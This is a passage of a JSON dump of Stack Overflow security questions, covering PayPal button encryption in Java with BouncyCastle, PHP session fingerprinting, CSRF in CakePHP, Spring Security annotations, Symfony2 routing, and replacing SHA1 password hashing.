java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\nimport java.security.Security;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertStoreException;\nimport java.security.cert.CertificateException;\nimport org.bouncycastle.cms.CMSException;\n\n/**\n */\npublic class ButtonEncryption {\n\n\n    //path to public cert\n    private static String certPath = \"C:/jakarta-tomcat/webapps/PlanB/Certs/public-cert.pem\";\n\n    //path to private key in PKCS12 format\n    private static String keyPath = \"C:/jakarta-tomcat/webapps/PlanB/Certs/my_pkcs12.p12\";\n\n    //path to Paypal's public cert\n    private static String paypalCertPath = \"C:/jakarta-tomcat/webapps/PlanB/Certs/paypal_cert_pem.txt\";\n\n    //private key password\n    private static String keyPass = \"password\"; //will be replaced with actual password when compiled and executed\n\n    //the button command, properties/parameters\n    private static String cmdText = \"cmd=_xclick\\nbusiness=buyer@hotmail.com\\nitem_name=vase\\nitemprice=25.00\";  //cmd=_xclick,business=sample@paypal.com,amount=1.00,currency_code=USD\n\n    //output file for form code\n    private static String output = \"test.html\";\n\n\n    public static void main(String[] args) \n    {\n        Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider()); \n\n\n        String stage = \"sandbox\";\n\n        try \n        {\n            ClientSide client_side = new ClientSide( keyPath, certPath, paypalCertPath, keyPass );\n\n            String result = client_side.getButtonEncryptionValue( cmdText, keyPath, certPath, paypalCertPath, keyPass );\n\n            File outputFile = new File( output );\n            if ( outputFile.exists() )\n                outputFile.delete();\n\n            if ( result != null &amp;&amp; result != \"\")\n            {\n                try {        \n                    OutputStream fout= new FileOutputStream( output );\n                    OutputStream bout= new BufferedOutputStream(fout);\n                    OutputStreamWriter out = new OutputStreamWriter(bout, \"US-ASCII\");\n\n                    out.write( \"&lt;form action=\\\"https://www.\" );\n                    out.write( stage );\n                    out.write( \"paypal.com/cgi-bin/webscr\\\" method=\\\"post\\\"&gt;\" );  \n                    out.write( \"&lt;input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"_s-xclick\\\"&gt;\" );  ;\n                    out.write( \"&lt;input type=\\\"image\\\" src=\\\"https://www.\" );\n                    out.write( stage );\n                    out.write( \"paypal.com/en_US/i/btn/x-click-but23.gif\\\" border=\\\"0\\\" name=\\\"submit\\\" \" );\n                    out.write( \"alt=\\\"Make payments with PayPal - it's fast, free and secure!\\\"&gt;\" );\n                    out.write( \"&lt;input type=\\\"hidden\\\" name=\\\"encrypted\\\" value=\\\"\" );\n                    out.write( result );\n                    out.write( \"\\\"&gt;\" );\n                    out.write( \"&lt;/form&gt;\");\n\n                    out.flush();  // Don't forget to flush!\n                    out.close();\n                  }\n                  catch (UnsupportedEncodingException e) {\n                    System.out.println(\n                     \"This VM does not support the ASCII character set.\"\n                    );\n                  }\n                  catch (IOException e) {\n                    System.out.println(e.getMessage());        \n                  }\n            }\n        } \n        catch (NoSuchAlgorithmException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (NoSuchProviderException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (IOException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (CMSException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (CertificateException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (KeyStoreException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (UnrecoverableKeyException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (InvalidAlgorithmParameterException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        } \n        catch (CertStoreException e) \n        {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>\n\n<p><br/></p>\n\n<h1>Edited : info about keys/certificates</h1>\n\n<p>I generated the Private Key and Public Certificate with OpenSSL via the following commands.\n<br/>\n<strong>Private Key</strong><br/>\nopenssl genrsa -out private-key.pem 1024\n<br/>\n<strong>Public Certificate</strong>\n<br/>openssl req -new -key private-key.pem -x509 -days 1095 -out public-cert.pem\n<br/>\n<strong>Created PKCS12 File</strong><br/>\nopenssl pkcs12 -export -in public-cert.pem -inkey private-key.pem -out my_pkcs12.p12</p>\n\n<p><br/>\nAdditionally, I had to download the Paypal Public Certificate from the Paypal website.</p>\n\n<p><br/></p>\n\n<h1>Edited - adding compilation warnings - BouncyCastle</h1>\n\n<pre><code>C:\\jakarta-tomcat\\webapps\\PlanB\\WEB-INF\\classes&gt;javac .\\palmb\\servlets\\paypal\\ClientSide.java -Xlint\n.\\palmb\\servlets\\paypal\\ClientSide.java:85: warning: [deprecation] addSigner(java.security.PrivateKey,java.security.cert.X509Certificate,java.lang.String) in org.bouncycastle.cms.CMSSignedDataGenerator has been deprecated\n                signedGenerator.addSigner( privateKey, certificate, CMSSignedDat\naGenerator.DIGEST_SHA1 );\n                               ^\n.\\palmb\\servlets\\paypal\\ClientSide.java:88: warning: [unchecked] unchecked call\nto add(E) as a member of the raw type java.util.ArrayList\n                certList.add(certificate);\n                            ^\n.\\palmb\\servlets\\paypal\\ClientSide.java:90: warning: [deprecation] addCertificatesAndCRLs(java.security.cert.CertStore) in org.bouncycastle.cms.CMSSignedGenerat\nor has been deprecated\n                signedGenerator.addCertificatesAndCRLs(certStore);\n                               ^\n.\\palmb\\servlets\\paypal\\ClientSide.java:97: warning: [deprecation] generate(org.\nbouncycastle.cms.CMSProcessable,boolean,java.lang.String) in org.bouncycastle.cm\ns.CMSSignedDataGenerator has been deprecated\n                CMSSignedData signedData = signedGenerator.generate(cmsByteArray, true, \"BC\");\n                                                          ^\n.\\palmb\\servlets\\paypal\\ClientSide.java:102: warning: [deprecation] addKeyTransR\necipient(java.security.cert.X509Certificate) in org.bouncycastle.cms.CMSEnvelope\ndGenerator has been deprecated\n                envGenerator.addKeyTransRecipient(payPalCert);\n                            ^\n.\\palmb\\servlets\\paypal\\ClientSide.java:103: warning: [deprecation] generate(org.bouncycastle.cms.CMSProcessable,java.lang.String,java.lang.String) in org.bouncycastle.cms.CMSEnvelopedDataGenerator has been deprecated\n                CMSEnvelopedData envData = envGenerator.generate( new CMSProcess\nableByteArray(signed),\n                                                       ^\n6 warnings\n</code></pre>\n\n<p><br/></p>\n\n<h1>JCE policy file installation steps</h1>\n\n<p>These are the steps I took to installing the JCE Unlimited Strength Policy files:<br/>\n1) Went to <a href=\"https://cds.sun.com/is-bin/INTERSHOP.enfinity/WFS/CDS-CDS_Developer-Site/en_US/-/USD/ViewProductDetail-Start?ProductRef=jce_policy-6-oth-JPR@CDS-CDS_Developer\" rel=\"nofollow\">Java JCE Download</a> Page on Oracle.<br/>\n2) Extracted files from zip.<br/>\n3) Placed local_policy.jar and US_export_policy.jar files in C:\\Java\\jdk1.6.0_22\\jre\\lib\\security folder. <br/>\nNote: C:\\Java\\jdk1.6.0_22 is set as %JAVA_HOME% \n<br/>\n4) Updated system classpath to include location of jars.\n<br/>\nNote: There are other files, that came with the JDK 1.6 within the security folder, including : java.policy, java.security, javaws.policy, trusted.libraries - but those probably have nothing to do with the JCE files, right?\n<br/></p>\n\n<hr/>\n\n<h1>Edit 6/23/2011 - results after further configuration</h1>\n\n<p>I went to Bouncy Castle page at <a href=\"http://www.bouncycastle.org/specifications.html#install\" rel=\"nofollow\">http://www.bouncycastle.org/specifications.html#install</a><br/>\nScroll down to <strong>5.0 Bouncy Castle Provider</strong> then read info under <strong>5.1 Example</strong>. It makes mention of adding a parameter for the Bouncy Castle Provider to the <code>java.security</code> file. My file is under C:\\Java\\jdk1.6.0_22\\jre\\lib\\security.<br/><br/>\nI added the following line to my file - <code>security.provider.10=org.bouncycastle.jce.provider.BouncyCastleProvider</code> <br/></p>\n\n<p>In addition, I discovered that I hadn't added the Bouncy Castle jars to the classpath, so I went ahead and did so.\n<br/></p>\n\n<p>Now after making these changes, recompiling and attempting to execute <code>ClientSide.java</code> I'm given the same exception : but maybe the focus should be on the part of the exception where it says this about bouncycastle provider -</p>\n\n<pre><code>at org.bouncycastle.jce.provider.JDKPKCS12KeyStore.cryptData(Unknown Source)\nat org.bouncycastle.jce.provider.JDKPKCS12KeyStore.engineLoad(Unknown Source)\n</code></pre>\n\n<p><strong>@PeteyB - I'm certain that I installed the policy files correctly. Based on what I've stated here, is there anything else you can suggest I try? Can you look at the Bouncy Castle site @ <a href=\"http://www.bouncycastle.org/specifications.html#install\" rel=\"nofollow\">http://www.bouncycastle.org/specifications.html#install</a> and see if there is something I'm missing?</strong></p>\n"},{"tags":["php","security","session","session-hijacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12091169,"title":"Adding token in browser fingerpint in session","body":"<p><a href=\"http://phpsec.org/projects/guide/4.html\" rel=\"nofollow\">This page</a> which is the number one result in Google for the term <em>php session security</em> and other similar terms advices to add a token in the user agent fingerprint. For some reason I do not get the point of it. Is this the pseudo code of it?</p>\n\n<pre><code>$token = 'my random token';\n\n$hash = hash('sha512', $_SERVER['HTTP_USER_AGENT'].$token);\n\nif (!isset($_SESSION['FINGERPRINT']))\n    $_SESSION['FINGERPRINT'] = $hash;\n\nif ($_SESSION['FINGERPRINT'] != $_GET['fingerprint'])\n    die('session hijacked');\n</code></pre>\n\n<p>If this is it, isn't it assumed that if the hacker get's the session id through http snooping then he probably also have the fingerprint?</p>\n"},{"tags":["asp.net-mvc","security","forms-authentication"],"answer_count":2,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":843,"score":3,"question_id":4043141,"title":"Securing the Forms Authentication Cookie when offloading SSL","body":"<p>I am attempting to secure a website I am currently developing using ASP.NET MVC 2.0 and forms authentication. In order to secure the forms authentication cookie I want to set the requiresSSL property to true so the cookie is only send by browsers when the connection is under SSL, and obviously ensure that all resources which require authorization are under SSL.</p>\n\n<p>My problem is that we are using Application Request Routing to fulfil a number of functions, one being SSL offloading, therefore by the time a request hits any web server in our farm the request is no longer under SSL and the FormsAuthentication.SetAuthCookie method fails because an SSL connection is required to set the cookie when requiresSSL is specified. </p>\n\n<p>Anyone have any ideas as to a work around here!</p>\n\n<p>Thanks</p>\n"},{"tags":["ruby-on-rails","security","field"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12089193,"title":"rails database field security","body":"<p>enter code herein rails</p>\n\n<pre><code>@user = User.new(params[:id])\n@user.update_attributes(params[:user])\n# params[:user] = {:admin =&gt; true, :name =&gt; \"stackoverflow\", ...}\n</code></pre>\n\n<p>in case\n:admin is only permitted service administrator.</p>\n\n<p>Developer didn't make  for admin(like  but some users insert  by force.</p>\n\n<p>I want that some fields are only permitted by someone has permission(not normal user)</p>\n\n<p>(in old times, i insert  by force.\npublic tumblr can not change to private tumblr but it is possible by inserting soem code lines)</p>\n"},{"tags":["security","cakephp","csrf","cakephp-2.1"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12054120,"title":"CakePHP 2.1: Using CSRF protection on Elements","body":"<p>I have a somewhat special situation with one of my CommentsController actions, the \"add\" action.\nSince I have an \"Add Comment\" form on my \"view\" View of PostsController, I have an \"add_comment\" Element instead of an \"add\" View for the Comments. This is that I can just insert the Element with the form inside the \"view\" View of Posts. I hope this does not sound too complicated. </p>\n\n<p>Now, inside the \"add_comment\" Element, the form gets submitted to the actual \"add\" action of CommentsController. If the form has to be rendered again, because of invalid user input for exaxmple, the form gets rendered again by - this time - calling the \"add\" View of Comments. This \"add\" View only again includes the \"add_comment\" Element, which - as was said above - includes the actual form.</p>\n\n<p>Now the thing is, I added the Security component to my CommentsController in order to get CSRF protection. All my admin actions of CommentsController get the protection i.e. e token is rendered inside the form and checked upon submitting the form.</p>\n\n<p>Still, the add_comments Element form does NOT get a token. Probably because it is an Element and not the corresponding View. </p>\n\n<p>How can I manually insert a token into the Element's form or how do I better solve this?</p>\n\n<p>Thank you</p>\n\n<p><strong>EDIT:</strong> Se also <a href=\"http://stackoverflow.com/questions/11347098/cakephp-2-1-validating-forms-coming-from-elements-in-a-smooth-way?rq=1\">my other question regarding the setup - it should explain it a little</a></p>\n\n<p><strong>EDIT2:</strong> <a href=\"http://pastebin.com/GNESQF9U\" rel=\"nofollow\">This</a> is what's inside my add_comment Element</p>\n\n<p><strong>EDIT3:</strong> <a href=\"http://pastebin.com/wgnn5jKz\" rel=\"nofollow\">This</a> is the HTML output of the add_comment element. The nonce should be in the <code>&lt;div style=\"display:none;\"&gt;</code> part.</p>\n\n<p><strong>EDIT4:</strong> I put <code>Debugger::log($this-&gt;Form-&gt;request-&gt;params);</code> inside the element (add_comment.ctp) and the view (add.ctp) and <a href=\"http://pastebin.com/bXPESsMX\" rel=\"nofollow\">this</a> shows the output.</p>\n\n<p>I also uploaded the the whole CommentsController (<a href=\"http://pastebin.com/4HPcHu6a\" rel=\"nofollow\">here</a>). Please note that I specified a blackhole function to catch errors of type 'auth'. This is because, every time I entered invalid data in the add_comments.ctp Element and - by submitting the form - the actual add Action of CommentsController was invoked (and thus the add View of comments), I got a blackhole error of type 'auth', which I could not explain so I caught it with this way - this might even be related to my problems.</p>\n"},{"tags":["security","symfony2","routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12086091,"title":"Security and routes - Symfony2","body":"<p>I want the index page for my project to be a login form with a link for registration below it and unlogged visitors should be able to see only the login form with route <code>/</code> and the register page with route <code>/register</code>. When the log I want they to be redirected to the home page with route <code>/home</code>. I tried some things and it's working in the dev environment (although having some troubles with the toolbar - <a href=\"http://stackoverflow.com/questions/12073945/symfony2-dev-environment\">Symfony2 - dev environment</a>) but when I switch to prod env, the browser says: \"The page isn't redirecting properly. Firefox has detected that the server is redirecting the request for this address in a way that will never complete. This problem can sometimes be caused by disabling or refusing to accept cookies.\" </p>\n\n<p>Here are my files:</p>\n\n<p><strong>security.yml</strong></p>\n\n<pre><code>security:\n    encoders:\n        EM\\MyFriendsBundle\\Entity\\User:\n            algorithm:        sha1\n            encode_as_base64: false\n            iterations:       1\n\nrole_hierarchy:\n    ROLE_ADMIN:       ROLE_USER\n\nproviders:\n    administrators:\n        entity: { class: EMMyFriendsBundle:User }\n\nfirewalls:\n    secured_area:\n        pattern:    ^/\n        anonymous: ~\n        form_login:\n            login_path:  /login\n            check_path:  /login_check\n            default_target_path: /home\n\naccess_control:\n    - { path: ^/home, roles: ROLE_ADMIN }\n</code></pre>\n\n<p><strong>routing.yml</strong></p>\n\n<pre><code>login_display:\n    pattern: /\n    defaults: { _controller: EMMyFriendsBundle:Welcome:display }\n\nlogin:\n    pattern:   /login\n    defaults:  { _controller: EMMyFriendsBundle:Welcome:login}\n\nlogin_check:\n    pattern:   /login_check\n\nregister:\n    pattern: /register\n    defaults: { _controller: EMMyFriendsBundle:Welcome:register }\n\nhome_display:\n    pattern: /home\n    defaults: { _controller: EMMyFriendsBundle:Home:display }\n</code></pre>\n\n<p><strong>WelcomeController.php</strong></p>\n\n<pre><code>&lt;?php\n\nnamespace EM\\MyFriendsBundle\\Controller;\n\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\Controller;\nuse Symfony\\Component\\Security\\Core\\SecurityContext;\n\nclass WelcomeController extends Controller\n{\n    public function displayAction()\n    {\n        $error=null;\n        $last_username=null;\n        return $this-&gt;render('EMMyFriendsBundle:Welcome:login.html.twig', array('error' =&gt; $error, 'last_username' =&gt; $last_username));\n    }\n\n    public function loginAction()\n    {\n        $request = $this-&gt;getRequest();\n        $session = $request-&gt;getSession();\n\n        // get the login error if there is one\n        if ($request-&gt;attributes-&gt;has(SecurityContext::AUTHENTICATION_ERROR)) {\n            $error = $request-&gt;attributes-&gt;get(SecurityContext::AUTHENTICATION_ERROR);\n        } else {\n            $error = $session-&gt;get(SecurityContext::AUTHENTICATION_ERROR);\n            $session-&gt;remove(SecurityContext::AUTHENTICATION_ERROR);\n        }\n\n        return $this-&gt;render('EMMyFriendsBundle:Welcome:login.html.twig', array(\n            // last username entered by the user\n            'last_username' =&gt; $session-&gt;get(SecurityContext::LAST_USERNAME),\n            'error'         =&gt; $error\n        ));\n    }\n\n    public function registerAction()\n    {\n         return $this-&gt;render('EMMyFriendsBundle:Welcome:register.html.twig');\n    }\n}\n</code></pre>\n\n<p><strong>HomeController.php</strong></p>\n\n<pre><code>&lt;?php\nnamespace EM\\MyFriendsBundle\\Controller;\n\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\Controller;\n\nclass HomeController extends Controller\n{\n    public function displayAction()\n    {\n        return $this-&gt;render('EMMyFriendsBundle:Home:home.html.twig');\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12088037,"title":"Xbootclasspath and Java security","body":"<p>Is it feasible for malicious software to use <a href=\"http://docs.oracle.com/javase/7/docs/technotes/tools/windows/java.html#nonstandard\" rel=\"nofollow\">Xbootclasspath</a> to get round Java security?</p>\n"},{"tags":["asp.net","security","forms-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12085786,"title":"Server is Able to Decrypt Forms Authentication Key Generated on my Local System","body":"<p>I am in .NET 4.0 paradigm and I noticed a scenario. My API was using <code>FormsAuthentication.Encrypt</code> method to create a token for the user. the problem is that if I run the API on localhost, call the api to get the key, I can use the same key on subsequent request to the server. Why is this happening? Is this desired behavior? Isn't it a security risk?</p>\n"}]}
{"total":17772,"page":20,"pagesize":100,"questions":[{"tags":["php","security","download","zip","fileshare"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12086128,"title":"Allowing secure downloads in PHP for websites","body":"<p>I have uploaded some zip files to my server and now want to allow a user to download them if he/she has an appropriate password. I'm coding in PHP and I've made it so a user cannot access the page with the links to zip files unless the proper password has been entered, but by having a link to my zip file the user could just see and in future cases type in the absolute location of the zip file and bypass my password checks. If I change the file permissions on the zip file then I can't have it as a link because the user won't be able to access it. How can I allow the user to get the zip file while still keeping it secure? Any suggestions would be much appreciated. </p>\n"},{"tags":["spring","security","annotations"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":12082904,"title":"Spring Security Method Security Annotations","body":"<p>Recently, I have begun a bit of a personal project, and I decided to implement Spring Security.  I have attempted to do so before, but I had no better luck that time than I am now.  I got around the problem then, but that method (accessing the security context directly from the code and checking the string of roles it contains for the current user) feels like a hack, and I would like to get it right this time.</p>\n\n<p>Right now I have Spring Security MOSTLY functioning, as far as I know...I can attempt to go to a page with a role-based redirect, and it will redirect me to the login page.  I can log in with good or bad information and be sent to the proper location.  What I cannot do, what I have never managed to do, is get the @Secured or @PreAuthorize annotation to function as I would hope.</p>\n\n<p>Let me try to explain (code will follow).  My welcome/login page is index.jsp and, when you log in, Spring Security sends you to login.html which is where I have a method in my LoginController class mapped.  Inside that method, I try to call a large set of other methods: none of this is supposed to be final, I am just trying to get prove to myself that things are running.</p>\n\n<p>I call two methods that are secured by @Secured, and two methods that are secured by @PreAuthorize, one \"ROLE_ADMIN\" and one \"ROLE_USER\" each.  The account that I am logging into only has the ROLE_USER authority.  This being the case, I would expect to get redirected to my accessdenied.jsp page as per having set that as the target of my Spring Security's access-denied-page attribute.  What I do not expect, and what I am seeing, is that every method is successfully called and run when I log in.</p>\n\n<p>I have (at least attempted to) follow the tutorials.  I have spent days on Google, reading everything that I can find.  I have merged my security context into my context, and everything else that came to my attention as a potential solution.  I apologize if I have been a mite long-winded, but I would rather provide too much information than too little.  To that end, the following is my code:</p>\n\n<p>index.jsp</p>\n\n<pre><code>    &lt;html&gt;\n    &lt;body&gt;\n        &lt;form action=\"j_spring_security_check\" method=\"POST\"&gt;\n            &lt;label for=\"j_username\"&gt;Name:&lt;/label&gt; \n            &lt;input id=\"j_username\" type='text' name='j_username' /&gt; \n            &lt;br /&gt; \n            &lt;label for=\"j_password\" class=\"passwordField\"&gt;Password:&lt;/label&gt; \n            &lt;input id=\"j_password\" type='password' name='j_password' /&gt; \n            &lt;br /&gt;\n            &lt;input id=\"proceed\" type=\"submit\" value=\"Submit\" /&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>\n\n<p>LoginController.java</p>\n\n<pre><code>package cribbage.controller;\n\nimport javax.servlet.http.HttpServletRequest;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.access.annotation.Secured;\nimport org.springframework.security.access.prepost.PreAuthorize;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport org.springframework.jdbc.core.JdbcTemplate;\n\nimport cribbage.database.entity.Test;\n\n@Controller\npublic class LoginController {\n    @Autowired\n    JdbcTemplate t;\n\n    @RequestMapping(value = \"/login\")\n    public ModelAndView login(HttpServletRequest request) {\n        test();\n        test2();\n        test3();\n        test4();\n        return new ModelAndView(\"test.jsp\");\n    }\n\n    @Secured(\"ROLE_ADMIN\")\n    public void test(){\n        System.out.println(\"Test One\");\n    }\n\n    @Secured(\"ROLE_USER\")\n    public void test2(){\n        System.out.println(\"Test Two\");\n    }\n\n    @PreAuthorize(\"hasRole('ROLE_ADMIN')\")\n    public void test3(){\n        System.out.println(\"Test Three\");\n    }\n\n    @PreAuthorize(\"hasRole('ROLE_USER')\")\n    public void test4(){\n        System.out.println(\"Test Four\");\n    }\n}\n</code></pre>\n\n<p>web.xml</p>\n\n<pre><code>&lt;web-app version=\"2.5\" xmlns=\"http://java.sun.com/xml/ns/javaee\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee \n                        http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\"&gt;\n\n&lt;listener&gt;\n    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n\n&lt;display-name&gt;Spring Security Tutorial Application&lt;/display-name&gt;\n\n&lt;!-- - Location of the XML file that defines the root application context \n    - Applied by ContextLoaderListener. --&gt;\n\n&lt;context-param&gt;\n    &lt;description&gt;Spring context file&lt;/description&gt;\n    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n    &lt;param-value&gt;\n       /WEB-INF/applicationContext.xml\n       /WEB-INF/applicationContext-security.xml\n   &lt;/param-value&gt;\n&lt;/context-param&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n\n&lt;!-- - Provides core MVC application controller. See bank-servlet.xml. --&gt;\n&lt;servlet&gt;\n    &lt;servlet-name&gt;Spring MVC Dispatcher Servlet&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n            /WEB-INF/applicationContext.xml\n            /WEB-INF/applicationContext-security.xml\n        &lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n\n&lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;Spring MVC Dispatcher Servlet&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n\n&lt;welcome-file-list&gt;\n    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;\n&lt;/welcome-file-list&gt;\n</code></pre>\n\n<p></p>\n\n<p>applicationContext.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:tx=\"http://www.springframework.org/schema/tx\"\n    xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:mvc=\"http://www.springframework.org/schema/mvc\" xmlns:security=\"http://www.springframework.org/schema/security\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n                    http://www.springframework.org/schema/beans/spring-beans-3.1.xsd            \n                    http://www.springframework.org/schema/tx\n                    http://www.springframework.org/schema/tx/spring-tx-3.1.xsd         \n                    http://www.springframework.org/schema/context \n                    http://www.springframework.org/schema/context/spring-context-3.1.xsd            \n                    http://www.springframework.org/schema/aop \n                    http://www.springframework.org/schema/aop/spring-aop.xsd\n                    http://www.springframework.org/schema/mvc\n                    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd\n                    http://www.springframework.org/schema/security \n                    http://www.springframework.org/schema/security/spring-security-3.1.xsd\"&gt;\n\n&lt;context:property-placeholder location=\"classpath:*.properties\" /&gt;\n\n&lt;mvc:annotation-driven /&gt;\n\n&lt;!-- Which packages to scan when looking for beans defined with @Component --&gt;\n&lt;context:component-scan scoped-proxy=\"targetClass\"\n    base-package=\"cribbage.controller\n                  cribbage.database.dao\n                  cribbage.database.entity\" /&gt;\n&lt;context:annotation-config /&gt;\n\n&lt;!-- Turn on AspectJ @Configurable support --&gt;\n\n&lt;!-- Turn on @Autowired, @PostConstruct etc support --&gt;\n&lt;bean\n    class=\"org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor\" /&gt;\n&lt;bean\n    class=\"org.springframework.context.annotation.CommonAnnotationBeanPostProcessor\" /&gt;\n\n&lt;!-- Add Transaction support --&gt;\n&lt;!-- Use @Transaction annotations for managing transactions --&gt;\n&lt;tx:annotation-driven transaction-manager=\"txManager\" /&gt;\n\n&lt;bean id=\"txManager\"\n    class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt;\n    &lt;property name=\"dataSource\" ref=\"dataSource\" /&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"messageSource\"\n    class=\"org.springframework.context.support.ResourceBundleMessageSource\" /&gt;\n\n&lt;bean id=\"localeResolver\"\n    class=\"org.springframework.web.servlet.i18n.SessionLocaleResolver\"\n    p:defaultLocale=\"en_US\" /&gt;\n\n&lt;!-- For database, uses maven filtering to fill in place holders --&gt;\n&lt;bean id=\"dataSource\" class=\"org.apache.commons.dbcp.BasicDataSource\"\n    destroy-method=\"close\"&gt;\n    &lt;property name=\"driverClassName\" value=\"${db.driver}\" /&gt;\n    &lt;property name=\"url\" value=\"${db.url}\" /&gt;\n    &lt;property name=\"username\" value=\"${db.username}\" /&gt;\n    &lt;property name=\"password\" value=\"${db.password}\" /&gt;\n    &lt;property name=\"maxActive\" value=\"10\" /&gt;\n    &lt;property name=\"maxIdle\" value=\"1\" /&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\"&gt;\n    &lt;constructor-arg ref=\"dataSource\" /&gt;\n&lt;/bean&gt;\n\n&lt;security:global-method-security\n    secured-annotations=\"enabled\" pre-post-annotations=\"enabled\" /&gt;\n</code></pre>\n\n<p></p>\n\n<p>applicationContext-security.xml</p>\n\n<pre><code>&lt;beans:beans xmlns=\"http://www.springframework.org/schema/security\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans \n                http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\n                http://www.springframework.org/schema/security \n                http://www.springframework.org/schema/security/spring-security-3.1.xsd\"&gt;\n\n&lt;http pattern=\"/CSS/**\" security=\"none\" /&gt;\n\n&lt;http auto-config=\"true\" use-expressions=\"true\" access-denied-page=\"/accessdenied.jsp\"&gt;\n    &lt;form-login always-use-default-target=\"false\"\n        login-processing-url=\"/j_spring_security_check\" default-target-url=\"/login.html\"\n        login-page=\"/index.jsp\" authentication-failure-url=\"/loginFailed.jsp\" /&gt;\n    &lt;logout logout-url=\"/j_spring_security_logout\" /&gt;\n    &lt;intercept-url pattern=\"/test.jsp\" access=\"hasRole('ROLE_USER')\" /&gt;\n&lt;/http&gt;\n\n&lt;authentication-manager&gt;\n    &lt;authentication-provider&gt;\n        &lt;jdbc-user-service data-source-ref=\"dataSource\"\n            users-by-username-query=\"select username,user_password,enabled from users where username=?\"\n            authorities-by-username-query=\"select username,authority,enabled from users where username=?\" /&gt;\n    &lt;/authentication-provider&gt;\n&lt;/authentication-manager&gt;\n</code></pre>\n\n<p></p>\n\n<p>Thank you for any help that you can provide.</p>\n"},{"tags":["php","security","sha1"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":98,"score":1,"question_id":12079194,"title":"What is a good alternative to SHA1 hashing for password storage?","body":"<p>I have a website which uses SHA1 hashing for passwords. I recently read the following article which argued not to use SHA1 for passwords since SHA1 was never designed to protect passwords: <a href=\"http://arstechnica.com/security/2012/08/passwords-under-assault/4/\" rel=\"nofollow\">http://arstechnica.com/security/2012/08/passwords-under-assault/4/</a></p>\n\n<p>Can you please recommend a good hasing method I can implement instead of SHA1 and please provide a link to a tutorial which describes 